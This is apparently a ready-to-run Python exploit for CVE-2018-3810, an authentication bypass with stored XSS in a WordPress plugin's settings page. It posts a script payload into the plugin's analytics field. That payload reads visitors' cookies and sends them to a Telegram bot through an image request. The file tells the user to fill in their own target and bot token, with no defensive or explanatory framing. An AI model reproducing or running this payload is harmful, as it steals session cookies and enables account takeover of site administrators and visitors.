import requests

# Exploit for CVE-2018-3810: Authentication bypass with resultant XSS

# Edit these values according to your target and Telegram
# HTTP_API_TOKEN = ''
# CHAT_ID = ''
js_code = """<script>
function sendCookies() {
    // nth347's evil code
    cookie = encodeURI(document.cookie);
    url = "https://api.telegram.org/botHTTP_API_TOKEN/sendMessage?chat_id=CHAT_ID=" + cookie;
    document.getElementById("attacker").src = url; 
}
</script>
<img id="attacker" src=x onerror="sendCookies();">
"""
URL = 'http://192.168.80.136/wp-admin/options-general.php?page=smartcode'


def create_session():
    return requests.Session()


def inject_js_code(session):
    data = {
        'sgcgoogleanalytic': f'{js_code}',
        'sgcwebtools': '',
        'button': 'Save Changes',
        'action': 'savegooglecode'
    }
    response = session.post(url=URL, data=data)
    if response.status_code == 200:
        print('[+] Code injected. Please notice your Telegram inbox\n')
    else:
        print('[-] Something went wrong\n')


if __name__ == '__main__':
    print('\n[i] Starting dirty work\n')
    session = create_session()
    inject_js_code(session)
